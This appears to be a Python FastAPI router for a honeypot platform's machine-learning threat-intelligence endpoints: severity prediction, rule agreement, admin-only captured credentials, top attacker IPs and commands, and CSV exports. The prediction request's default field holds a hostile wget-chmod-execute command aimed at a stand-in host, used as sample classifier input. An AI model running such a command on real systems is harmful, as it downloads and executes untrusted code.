import csv
import datetime
import io
import os
import urllib.parse
from typing import Optional

from fastapi import APIRouter, Depends, HTTPException, Query
from fastapi.responses import Response
from pydantic import BaseModel, Field
from sqlalchemy import func
from sqlalchemy.orm import Session

from app import models
from app.config import settings
from app.database import get_db
from app.ml.features import FEATURE_COLUMNS, featurize
from app.ml.predictor import predict_single_event
from app.ml.trainer import SAVED_MODELS_DIR, get_latest_metrics, train_models
from app.security import get_current_user, require_admin, require_analyst
from app.serializers import event_to_dict

router = APIRouter(prefix="/ml", tags=["Machine Learning Threat Intelligence"])


class EventPredictionRequest(BaseModel):
    eventid: Optional[str] = Field("cowrie.command.input", max_length=100)
    protocol: Optional[str] = Field("SSH", max_length=10)
    dst_port: Optional[int] = Field(22, ge=0, le=65535)
    username: Optional[str] = Field("root", max_length=100)
    password: Optional[str] = Field(None, max_length=100)
    command: Optional[str] = Field("wget http://203.0.113.9/bot.sh; chmod +x bot.sh; ./bot.sh", max_length=4096)
    duration: Optional[float] = Field(12.5, ge=0)


class TrainRequest(BaseModel):
    sessions: int = Field(1500, ge=100, le=20000)
    seed: int = 42


@router.get("/metrics")
def get_ml_model_metrics(user=Depends(get_current_user)):
    """Latest training metadata and held-out test metrics (computed from real predictions)."""
    return get_latest_metrics()


@router.post("/train")
def trigger_model_training(req: Optional[TrainRequest] = None, db: Session = Depends(get_db), user=Depends(require_analyst)):
    """Retrains both models on the synthetic labelled dataset (sync handler -> runs in threadpool)."""
    req = req or TrainRequest()
    res = train_models(n_sessions=req.sessions, seed=req.seed)
    if not res.get("success"):
        raise HTTPException(status_code=400, detail=res.get("error", "Training failed"))
    db.add(models.AuditLog(timestamp=datetime.datetime.utcnow(), user_id=user.id, username=user.username,
                           action="ML_MODELS_TRAINED", resource="ML",
                           details=f"version={res['metrics']['model_version']} sessions={req.sessions} seed={req.seed}"))
    db.commit()
    return res


@router.post("/predict")
def predict_threat_severity(payload: EventPredictionRequest, user=Depends(get_current_user)):
    return predict_single_event(payload.model_dump())


@router.get("/rule-agreement")
def rule_agreement(limit: int = Query(500, ge=50, le=5000), db: Session = Depends(get_db), user=Depends(get_current_user)):
    """
    Compares ML output with rule-based detections over the most recent events:
    an event is 'rule-flagged' if it is evidence for any alert.
    """
    events = db.query(models.HoneypotEvent).order_by(models.HoneypotEvent.timestamp.desc()).limit(limit).all()
    if not events:
        return {"status": "NO_DATA", "events": 0}
    flagged = set()
    for (ev,) in db.query(models.Alert.evidence).all():
        flagged.update((ev or {}).get("event_ids", []))
    probe = predict_single_event(event_to_dict(events[0], include_secrets=True))
    if probe["model_status"] != "TRAINED":
        return {"status": probe["model_status"], "reason": probe.get("reason"), "events": len(events)}
    both = ml_only = rule_only = neither = 0
    anomalies_with_rule = anomalies = 0
    for e in events:
        p = predict_single_event(event_to_dict(e, include_secrets=True))
        ml_hi = p["predicted_severity"] in ("high", "critical")
        r = e.id in flagged
        both += ml_hi and r; ml_only += ml_hi and not r; rule_only += r and not ml_hi; neither += not (r or ml_hi)
        if p["is_anomalous"]:
            anomalies += 1
            anomalies_with_rule += r
    n = len(events)
    return {"status": "OK", "events": n, "model_version": probe.get("model_version"),
            "matrix": {"ml_high_and_rule": both, "ml_high_only": ml_only, "rule_only": rule_only, "neither": neither},
            "agreement_rate": round((both + neither) / n, 4),
            "anomalies": anomalies, "anomalies_also_rule_flagged": anomalies_with_rule,
            "note": "Rules are the system of record; ML disagreement is a triage hint, not a verdict."}


@router.get("/credentials")
def get_database_credentials(query: Optional[str] = Query(None, max_length=100), limit: int = Query(20, ge=1, le=200),
                             db: Session = Depends(get_db), user=Depends(require_admin)):
    """Captured honeypot credentials - sensitive, admin-only, audited."""
    q = db.query(models.HoneypotEvent).filter(
        (models.HoneypotEvent.username.isnot(None)) | (models.HoneypotEvent.password.isnot(None)))
    if query:
        pattern = f"%{query}%"
        q = q.filter(models.HoneypotEvent.username.like(pattern) | models.HoneypotEvent.password.like(pattern) |
                     models.HoneypotEvent.src_ip.like(pattern))
    results = q.order_by(models.HoneypotEvent.timestamp.desc()).limit(limit).all()
    db.add(models.AuditLog(timestamp=datetime.datetime.utcnow(), user_id=user.id, username=user.username,
                           action="CAPTURED_CREDENTIALS_VIEWED", resource="ML", details=f"{len(results)} records"))
    db.commit()
    return {"status": "success", "query": query or "ALL", "total_found": len(results), "credentials": [{
        "id": i.id, "username": i.username or "[EMPTY]", "password": i.password or "[EMPTY]", "protocol": i.protocol,
        "src_ip": i.src_ip, "severity": i.severity, "data_origin": i.data_origin,
        "timestamp": i.timestamp.isoformat() if i.timestamp else ""} for i in results]}


@router.get("/top-ips")
def get_top_attacking_ips(limit: int = Query(15, ge=1, le=100), db: Session = Depends(get_db), user=Depends(get_current_user)):
    E = models.HoneypotEvent
    rows = (db.query(E.src_ip, func.max(E.country), func.max(E.asn), func.count(E.id).label("n"))
            .group_by(E.src_ip).order_by(func.count(E.id).desc()).limit(limit).all())
    return {"status": "success", "total_unique": len(rows), "top_ips": [
        {"src_ip": ip, "country": c or "Unknown", "asn": a or "Unknown", "attack_count": n} for ip, c, a, n in rows]}


@router.get("/top-commands")
def get_top_malicious_commands(limit: int = Query(15, ge=1, le=100), db: Session = Depends(get_db), user=Depends(get_current_user)):
    E = models.HoneypotEvent
    rows = (db.query(E.command, func.max(E.severity), func.max(E.protocol), func.count(E.id))
            .filter(E.command.isnot(None), E.command != "").group_by(E.command)
            .order_by(func.count(E.id).desc()).limit(limit).all())
    return {"status": "success", "total": len(rows), "top_commands": [
        {"command": c, "severity": s, "protocol": p, "exec_count": n} for c, s, p, n in rows]}


@router.get("/threat-summary")
def get_threat_summary(db: Session = Depends(get_db), user=Depends(get_current_user)):
    E = models.HoneypotEvent
    return {
        "status": "ONLINE",
        "total_database_events": db.query(func.count(E.id)).scalar() or 0,
        "unique_attacker_ips": db.query(func.count(func.distinct(E.src_ip))).scalar() or 0,
        "unique_usernames_tested": db.query(func.count(func.distinct(E.username))).scalar() or 0,
        "protocols": {p or "unknown": n for p, n in db.query(E.protocol, func.count(E.id)).group_by(E.protocol).all()},
        "events_by_origin": {o or "unknown": n for o, n in db.query(E.data_origin, func.count(E.id)).group_by(E.data_origin).all()},
    }


@router.get("/audit-url")
def audit_website_url(url: str = Query(..., max_length=2048), db: Session = Depends(get_db), user=Depends(get_current_user)):
    """Offline heuristic URL check (no network request is made). Not a reputation verdict."""
    parsed = urllib.parse.urlparse(url if "://" in url else f"http://{url}")
    host = (parsed.hostname or "").lower()
    seen = db.query(models.HoneypotEvent).filter(
        (models.HoneypotEvent.src_ip == host) | (models.HoneypotEvent.command.like(f"%{host}%"))).first() if host else None
    is_http = parsed.scheme.lower() == "http"
    script_ext = any(parsed.path.lower().endswith(x) for x in (".sh", ".exe", ".bin", ".elf", ".bat", ".ps1", ".py", ".pl"))
    findings = []
    if is_http:
        findings.append("plaintext HTTP")
    if script_ext:
        findings.append("script/binary file extension")
    if seen:
        findings.append(f"host observed in honeypot event #{seen.id}")
    return {"status": "success", "url": url, "host": host, "method": "offline heuristics only",
            "findings": findings, "is_recorded_in_honeypot_db": bool(seen),
            "note": "Use /api/v1/threat-intel/lookup for provider reputation."}


@router.get("/pipelines")
def get_ml_pipelines_info(user=Depends(get_current_user)):
    m = get_latest_metrics()
    def size(name):
        p = os.path.join(SAVED_MODELS_DIR, name)
        return round(os.path.getsize(p) / 1024, 1) if os.path.exists(p) else None
    trained = m.get("status") == "TRAINED"
    return {
        "status": m.get("status"),
        "model_version": m.get("model_version"),
        "dataset": m.get("dataset"),
        "test_samples": m.get("test_samples"),
        "test_accuracy": m.get("accuracy") if trained else None,
        "test_macro_f1": m.get("f1_score") if trained else None,
        "pipelines": [
            {"name": "Supervised severity classifier", "algorithm": "RandomForestClassifier(class_weight='balanced')",
             "selected_max_depth": (m.get("model_selection") or {}).get("chosen"), "file_name": "severity_classifier.joblib",
             "file_size_kb": size("severity_classifier.joblib"), "features_count": len(FEATURE_COLUMNS),
             "target_labels": ["low", "medium", "high", "critical"]},
            {"name": "Unsupervised anomaly detector", "algorithm": "IsolationForest(contamination='auto')",
             "file_name": "anomaly_detector.joblib", "file_size_kb": size("anomaly_detector.joblib"),
             "evaluation": m.get("anomaly_detector")},
        ],
    }


@router.get("/export/features-csv")
def export_ml_features_csv(limit: int = Query(5000, ge=1, le=50000), db: Session = Depends(get_db), user=Depends(require_analyst)):
    events = db.query(models.HoneypotEvent).order_by(models.HoneypotEvent.timestamp.desc()).limit(limit).all()
    if not events:
        raise HTTPException(status_code=404, detail="No events found")
    buf = io.StringIO()
    w = csv.writer(buf)
    w.writerow(["id", "data_origin"] + FEATURE_COLUMNS)
    for e in events:
        f = featurize(event_to_dict(e, include_secrets=True))
        w.writerow([e.id, e.data_origin] + [f[c] for c in FEATURE_COLUMNS])
    return Response(content=buf.getvalue(), media_type="text/csv",
                    headers={"Content-Disposition": "attachment; filename=ml_features.csv"})


@router.get("/export/importance-csv")
def export_feature_importance_csv(user=Depends(get_current_user)):
    imps = get_latest_metrics().get("feature_importances", {})
    buf = io.StringIO()
    w = csv.writer(buf)
    w.writerow(["FeatureName", "ImportanceWeight", "Percentage"])
    for feat, imp in imps.items():
        w.writerow([feat, round(imp, 6), f"{round(imp * 100, 2)}%"])
    return Response(content=buf.getvalue(), media_type="text/csv",
                    headers={"Content-Disposition": "attachment; filename=ml_feature_importance.csv"})
